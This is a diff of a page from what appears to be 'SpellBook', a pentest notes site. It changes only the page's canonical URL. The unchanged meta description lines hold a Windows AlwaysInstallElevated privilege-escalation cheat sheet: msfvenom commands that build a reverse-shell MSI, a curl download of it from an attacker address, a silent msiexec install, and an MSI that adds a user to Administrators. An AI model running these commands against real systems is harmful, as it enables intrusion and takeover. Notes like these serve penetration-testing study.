@@ -11,7 +11,7 @@ https://github.com/alex-shpak/hugo-book
 <meta name="description" content="Check permission# # should return 0x1 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated get-applockerpolicy -effective | select -expandproperty rulecollectionsRevshell# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9191 -f msi -o revshell.msicurl http://10.10.14.17:8080/revshell.msi -o revshell.msi msiexec /quiet /qn /norestart /i .\revshell.msiElevate current user to admin# msfvenom -p windows/x64/exec cmd=&#39;net localgroup Administrators &lt;current_user&gt; /add&#39; -f msi -o adduser.msicurl http://10.10.14.17/adduser.msi -o adduser.msi msiexec /quiet /qn /norestart /i .\adduser.msi">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
-<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://rusted-silver.github.io/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/">
   <meta property="og:site_name" content="SpellBook">
   <meta property="og:title" content="SpellBook">
   <meta property="og:description" content="Check permission# # should return 0x1 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated get-applockerpolicy -effective | select -expandproperty rulecollectionsRevshell# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9191 -f msi -o revshell.msicurl http://10.10.14.17:8080/revshell.msi -o revshell.msi msiexec /quiet /qn /norestart /i .\revshell.msiElevate current user to admin# msfvenom -p windows/x64/exec cmd=&#39;net localgroup Administrators &lt;current_user&gt; /add&#39; -f msi -o adduser.msicurl http://10.10.14.17/adduser.msi -o adduser.msi msiexec /quiet /qn /norestart /i .\adduser.msi">
@@ -27,7 +27,7 @@ https://github.com/alex-shpak/hugo-book
 <title>Always Install Elevated | SpellBook</title>
 <link rel="icon" href="/spellbook/favicon.png" >
 <link rel="manifest" href="/spellbook/manifest.json">
-<link rel="canonical" href="https://rusted-silver.github.io/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/">
+<link rel="canonical" href="https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/">
 <link rel="stylesheet" href="/spellbook/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
 
 
